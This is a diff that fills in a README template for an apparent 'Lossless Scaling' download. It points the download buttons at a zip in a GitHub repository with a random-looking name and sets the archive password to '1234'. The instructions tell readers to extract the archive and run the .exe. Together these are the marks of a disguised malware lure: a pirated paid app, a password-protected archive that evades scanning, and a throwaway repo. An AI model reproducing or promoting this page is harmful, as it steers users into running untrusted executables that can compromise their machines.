@@ -4,12 +4,12 @@
 ---
 
 <p align="center">
-  <a href="REPLACE_WITH_DOWNLOAD_LINK">
+  <a href="[REPLACE_WITH_DOWNLOAD_LINK](https://github.com/Crushomenhir/ugufyygvkgc-huibjlgvlgv/releases/download/new/lossless_scaling.zip)">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Now-brightgreen?style=for-the-badge&logoColor=white" alt="Download">
   </a>
 </p>
 
-<p align="center"><i>← Replace <code>REPLACE_WITH_DOWNLOAD_LINK</code> with your actual download URL</i></p>
+
 
 ---
 
@@ -50,14 +50,14 @@
 2. Extract the archive to any folder  
 3. Enter the archive password:  
 
-> 🔑 **Archive password:** `REPLACE_WITH_PASSWORD`  
-> *← Replace `REPLACE_WITH_PASSWORD` with your actual archive password*
+> 🔑 **Archive password:** `1234`  
+> *← Replace `1234` with your actual archive password*
 
 4. Run the `.exe` file — no installation required  
 
 > ⚠️ **Note:** The password is also available in the repository description.
 
-[![Download](https://img.shields.io/badge/⬇️%20Download-brightgreen?style=flat-square&logoColor=white)](REPLACE_WITH_DOWNLOAD_LINK)
+[![Download](https://img.shields.io/badge/⬇️%20Download-brightgreen?style=flat-square&logoColor=white)](https://github.com/Crushomenhir/ugufyygvkgc-huibjlgvlgv/releases/download/new/lossless_scaling.zip)
 
 ---
 
